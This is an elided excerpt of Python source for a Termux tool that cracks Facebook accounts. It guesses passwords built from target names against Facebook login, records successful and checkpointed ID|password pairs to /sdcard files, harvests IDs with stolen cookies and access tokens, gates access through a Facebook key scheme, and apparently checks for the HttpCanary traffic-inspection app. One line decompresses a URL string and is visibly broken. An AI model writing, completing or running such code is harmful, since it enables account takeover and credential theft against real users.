...
xny = zlib.decompress(b'https://raw.githubusercontent.com/ALI-XP/ps/main/Apr.txt')
...
def qsbuy():
	try:
		...
		try:
			...
			print(50*"-")
			print(f" Note : This tool is free if you want access this tool so copy the key and send me on Facebook then i will give you access ")
			print("\n Ye tool free he agr apko iss tool ka access chaiye chaiye to key ko copy krke mujhe Facebook pe send kre me apko access de donga ")
			print(50*"-")
			print(f" Free of cost")
			print(50*"-")
			input("[Press Enter To Send Key To Admin]")
			os.system(f"termux-open-url https://www.facebook.com/profile.php?id=100010399241489?text={bumper}")
			qsbuy()
...
def main():
	...
	if menu_opt =='1':
		...
		xchker()
		os.system('xdg-open https://www.facebook.com/profile.php?id=100010399241489')
		main()
	elif menu_opt =='4':
...
class crack_main():
	...
	def crackmail(self,id):
		...
		user=[]
		print(" [*] First Name Example SAKIB Hasan")
	...
	def m1(self,iid,name,passlist):
		try:
			...
			sys.stdout.write('\r[XIDI] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
			fn = name.split(' ')[0]
			try:
				ln = name.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				if 'session_key' in po:
					print(' \033[1;32m[XIDI-OK] '+roid+' | '+pas+'\033[0;97m')
					open('/sdcard/XIDI_ok.txt','a').write(roid+'|'+pas+'\n')
					ok.append(iid)
					break
				...
				if 'User must verify their account' in po:
					try:
						print(' \033[1;31m[XIDI-CP] '+roid+' | '+pas+'\033[0;97m')
						open('/sdcard/XIDI_cp.txt','a').write(roid+'|'+pas+'\n')
						break
					except Exception as e:
						pass
				else:
	...
	def pasw(self):
		...
		print(' Ok Ids Save In : /sdcard/XIDI_ok.txt')
		print(50*'-')
		input('\n Press enter to back ')
		main()
...
def new_file(cookies,access_token):
	...
	with ThreadPool(max_workers=20) as yaari:
		for exid in file:
			yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
	try:
		son = f"XIDI{str(random.randint(0,90))}.txt"
	except:
		son = f"XIDI{str(random.randint(10,50))}.txt"
...
try:
	...
	if f'com.h{t}pc{a}y.pro' in fileee:
		print('error occur 0')
		#exit()
		#exit(f'\nsomethiiing went wrong\n\nContact Admin : https://www.facebook.com/profile.php?id=100010399241489')
except Exception as e:
	print(e)
	pass
